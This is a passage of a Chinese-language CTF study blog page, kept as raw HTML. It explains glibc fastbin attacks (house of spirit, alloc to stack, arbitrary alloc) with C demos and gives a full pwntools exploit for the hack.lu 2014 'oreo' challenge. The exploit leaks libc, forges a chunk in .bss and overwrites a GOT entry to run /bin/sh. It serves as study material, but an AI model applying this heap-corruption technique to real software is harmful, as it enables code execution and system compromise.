class="line">	fprintf(stderr, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	malloc(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">	unsigned long long *a;</span><br><span class="line">	// This has nothing to do <span class="keyword">with</span> fastbinsY (do <span class="keyword">not</span> be fooled by the <span class="number">10</span>) - fake_chunks <span class="keyword">is</span> just a piece of memory to fulfil allocations (pointed to <span class="keyword">from</span> fastbinsY)</span><br><span class="line">	unsigned long long fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, sizeof(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; // this <span class="keyword">is</span> the size</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        // fake_chunks[<span class="number">9</span>] because <span class="number">0x40</span> / sizeof(unsigned long long) = <span class="number">8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; // nextsize</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	fprintf(stderr, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	fprintf(stderr, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, malloc(<span class="number">0x30</span>));</span><br></pre></td></tr></table></figure>

<h3 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc    to    Stack"></a>Alloc    to    Stack</h3><p>原理也是利用fastbins attack，不过利用的思路不一样，大概思路就是在栈上布置fake_chunk，然后修改fastbin上的fd指向这个fake_chunk，这样就在栈上申请了一个堆，就能往栈上写入数据或者读取数据了，比如覆盖个返回地址啥的，但个人感觉这个思路的约束条件挺多的，得知道栈上的地址，得有合适的size（自己构造的或者栈上本来就有的）,得可以控制fastbin的链表。不够普遍，只适合适合他的题。</p>
<p>下面的代码大概复现了思路。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CHUNK stack_chunk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk1=&amp;stack_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary     Alloc"></a>Arbitrary     Alloc</h3><p>这个和上面那个一样，就是伪造的chunk范围更广，只要有适合的size和地址，就可以fake_chunk，注意fake_chunk的地址可以是错位的，只要第二个八字节size能通过验证就行。比如分配到mall0c_hook地址附近。</p>
<h2 id="2014-hack-lu-oreo例题"><a href="#2014-hack-lu-oreo例题" class="headerlink" title="2014 hack.lu oreo例题"></a>2014 hack.lu oreo例题</h2><p>伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_804898D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What would you like to do?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%u. Add new rifle\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%u. Show added rifles\n&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%u. Order selected rifles\n&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%u. Leave a Message with your Order\n&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%u. Show current stats\n&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%u. Exit!\n&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( sub_8048896() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_8048644();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_8048729();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sub_8048810();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sub_80487B4();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        sub_8048906();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v1;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为不认识英文单词，所以得不到文字提示，得仔细审计才看懂了代码，简而言之，1就是增加分配一个堆，然后堆的最后四位储存上一个堆的地址，这里可以进行覆盖。2是输出堆的信息，这里可以输出刚才输入的信息，只要在输入时填入got表，就能输出获得基地址，3是free函数，可以把malloc到的堆看成一个链表，3能释放一整个链表的堆，而且下一个堆的地址是可以控制的，也就是可以控制任意堆进行free,在地址处填入fake_chunk的地址，就可以把fake_chunk给free掉。4是一个输入函数，可以往指定bss段的0x804A2A8写入数据。而这个地址空间里储存着一个地址0x804A2c0,是往0x804A2c0中写入数据。</p>
<p>总结：功能很多，漏洞主要是堆溢出，可以更改堆地址，导致可以fake_chunk到fastbin上，能够布置堆的地方也只有bss段，刚开始我随便注意了chunk，能够malloc回来，但发现没啥用，只有像官方wp一样布置堆到0x804A2A8才行，主要是因为这个函数，他可以向0x804A2A8中写入数据，把堆申请到这以后让0x804A2A8储存某个函数的got表，就可以更改含食宿地址了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80487B4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter any notice you&#x27;d like to submit with your order: &quot;</span>);</span><br><span class="line">  fgets(dword_804A2A8, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485EC(dword_804A2A8);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是最后的payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x08048894&#x27;)</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#sh.recvuntil(&#x27;Rifle name: &#x27;)</span></span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    <span class="comment">#sh.recvuntil(&#x27;Rifle description: &#x27;)</span></span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name=<span class="string">&#x27;a&#x27;</span>*<span class="number">27</span>+p32(puts_got)</span><br><span class="line">alloc(name,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Description: aaa&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_addr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base=puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0x40</span>):</span><br><span class="line">    alloc(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">name=<span class="string">&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x0804A2A8</span>)</span><br><span class="line">alloc(name,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x38</span>-<span class="number">0x18</span>-<span class="number">0x4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">enter(payload)</span><br><span class="line">delete()</span><br><span class="line">alloc(<span class="string">&#x27;a&#x27;</span>,p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>]))</span><br><span class="line">enter(p32(system)+<span class="string">&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>思考：</p>
<p>​    1.把fake_chunk给free到fastbins上利用了house_of_spirit技术，这个利用思路是有约束条件的，一个是size必须是2 * SIZE_SZ整数倍，fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>（64位是8字节，32位是4字节），同时也不能大于<code>av-&gt;system_mem</code> 。</p>
<p>​    2.如果能fake chunk的话，要思考自己fake到哪个位置才有用，就像我这次虽然能fake,但是fake完发现根本没法利用，那什么才是有用的呢，就我目前来看，如果程序里能往某个变量了写入或者输出数据，那就可以考虑在fake chunk时覆盖这个变量，然后把变量处覆盖成任意地址，就可以完成任意地址写入或者输出了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">我的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
